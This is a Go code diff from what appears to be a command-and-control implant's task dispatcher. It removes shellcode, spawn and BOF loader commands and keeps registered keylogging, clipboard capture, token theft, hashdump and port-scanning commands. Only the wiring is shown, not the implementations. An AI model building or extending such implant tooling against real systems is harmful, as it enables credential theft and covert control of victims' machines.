@@ -58,10 +58,7 @@ const (
 	CmdHostLogoff    = int(protocol.CmdHostLogoff)
 	CmdHostLock      = int(protocol.CmdHostLock)
 
-	// Loader / post-exploitation
-	CmdExecShellcode = int(protocol.CmdExecShellcode)
-	CmdSpawn         = int(protocol.CmdSpawn)
-	CmdBOF           = int(protocol.CmdBOF)
+	// Post-exploitation
 	CmdJobList       = int(protocol.CmdJobList)
 	CmdJobKill       = int(protocol.CmdJobKill)
 	CmdPortscan      = int(protocol.CmdPortscan)
@@ -70,7 +67,6 @@ const (
 	CmdKeylog        = int(protocol.CmdKeylog)
 	CmdClipboard     = int(protocol.CmdClipboard)
 	CmdNetEnum       = int(protocol.CmdNetEnum)
-	CmdDiagSSN       = int(protocol.CmdDiagSSN)
 	CmdTokenSteal    = int(protocol.CmdTokenSteal)
 	CmdTokenRevert   = int(protocol.CmdTokenRevert)
 	CmdHashdump      = int(protocol.CmdHashdump)
@@ -130,9 +126,6 @@ type Dispatcher struct {
 	jobsMu sync.Mutex
 	jobs   map[string]*job
 
-	// loader used by the shellcode/BOF/PE execution commands
-	loader *loaderctl
-
 	mu            sync.Mutex
 	pendingBlocks []Result // queued download chunks waiting for the next checkin
 }
@@ -160,7 +153,6 @@ func NewDispatcher(onSleep SleepCallback, onExit ExitCallback) *Dispatcher {
 		shellTimeout: CommandTimeout,
 		registry:     make(commandRegistry),
 		jobs:         make(map[string]*job),
-		loader:       newLoader(),
 	}
 	d.registerDefaults()
 	return d
@@ -226,9 +218,6 @@ func (d *Dispatcher) registerDefaults() {
 		uint32(CmdHostShutdown):  func(d *Dispatcher, t *Task) *Result { return d.finish(t, execHostShutdown(), "") },
 		uint32(CmdHostLogoff):    func(d *Dispatcher, t *Task) *Result { return d.finish(t, execHostLogoff(), "") },
 		uint32(CmdHostLock):      func(d *Dispatcher, t *Task) *Result { return d.finish(t, execHostLock(), "") },
-		uint32(CmdExecShellcode): d.execShellcodeCmd,
-		uint32(CmdSpawn):         d.execSpawnCmd,
-		uint32(CmdBOF):           d.execBOFCmd,
 		uint32(CmdJobList):       d.execJobListCmd,
 		uint32(CmdJobKill):       d.execJobKillCmd,
 		uint32(CmdPortscan):      d.execPortscanCmd,
@@ -237,7 +226,6 @@ func (d *Dispatcher) registerDefaults() {
 		uint32(CmdKeylog):        d.execKeylogCmd,
 		uint32(CmdClipboard):     d.execClipboardCmd,
 		uint32(CmdNetEnum):       d.execNetEnumCmd,
-		uint32(CmdDiagSSN):       d.execDiagSSNCmd,
 		uint32(CmdTokenSteal):    d.execTokenStealCmd,
 		uint32(CmdTokenRevert):   d.execTokenRevertCmd,
 		uint32(CmdHashdump):      d.execHashdumpCmd,
